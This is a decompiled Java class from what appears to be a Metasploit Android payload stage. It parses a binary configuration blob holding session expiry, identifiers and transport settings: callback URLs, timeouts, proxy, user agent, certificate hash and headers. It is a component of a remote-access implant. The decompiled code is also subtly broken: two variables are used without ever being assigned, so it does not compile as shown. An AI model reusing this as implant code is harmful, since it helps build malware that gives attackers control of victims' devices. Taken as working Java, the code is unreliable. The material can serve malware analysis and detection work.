package com.metasploit.stage;

import java.io.UnsupportedEncodingException;
import java.util.concurrent.TimeUnit;
/* loaded from: classes.dex */
public final class b {
    private static final long a = TimeUnit.SECONDS.toMillis(1);

    private static int a(byte[] bArr, int i) {
        int i2 = 0;
        for (int i3 = 0; i3 < 4; i3++) {
            i2 |= (bArr[i3 + i] & 255) << (i3 << 3);
        }
        return i2;
    }

    public static a a(byte[] bArr) {
        int i;
        int i2;
        a aVar = new a();
        aVar.a = a(bArr, 0);
        aVar.b = a * a(bArr, 12);
        b(bArr, 16, 16);
        b(bArr, 32, 16);
        int i3 = 48;
        if ((aVar.a & 1) != 0) {
            aVar.c = a(bArr, 8000, 100);
        }
        while (bArr[i3] != 0) {
            g gVar = new g();
            gVar.a = a(bArr, i3, 512);
            gVar.b = a * a(bArr, i);
            gVar.c = a * a(bArr, i2);
            i3 = i3 + 512 + 4 + 4 + 4;
            if (gVar.a.startsWith("http")) {
                a(bArr, i3, 128);
                int i4 = i3 + 128;
                a(bArr, i4, 64);
                int i5 = i4 + 64;
                a(bArr, i5, 64);
                int i6 = i5 + 64;
                gVar.d = a(bArr, i6, 256);
                int i7 = i6 + 256;
                gVar.e = null;
                byte[] b = b(bArr, i7, 20);
                int i8 = i7 + 20;
                int i9 = 0;
                while (true) {
                    if (i9 >= b.length) {
                        break;
                    } else if (b[i9] != 0) {
                        gVar.e = b;
                        break;
                    } else {
                        i9++;
                    }
                }
                StringBuilder sb = new StringBuilder();
                int length = bArr.length;
                for (int i10 = i8; i10 < length; i10++) {
                    byte b2 = bArr[i10];
                    if (b2 == 0) {
                        break;
                    }
                    sb.append((char) (b2 & 255));
                }
                String sb2 = sb.toString();
                gVar.f = sb2;
                i3 = sb2.length() + i8;
            }
            aVar.d.add(gVar);
        }
        return aVar;
    }

    private static String a(byte[] bArr, int i, int i2) {
        byte[] b = b(bArr, i, i2);
        try {
            return new String(b, "ISO-8859-1").trim();
        } catch (UnsupportedEncodingException e) {
            return new String(b).trim();
        }
    }

    private static byte[] b(byte[] bArr, int i, int i2) {
        byte[] bArr2 = new byte[i2];
        System.arraycopy(bArr, i, bArr2, 0, i2);
        return bArr2;
    }
}
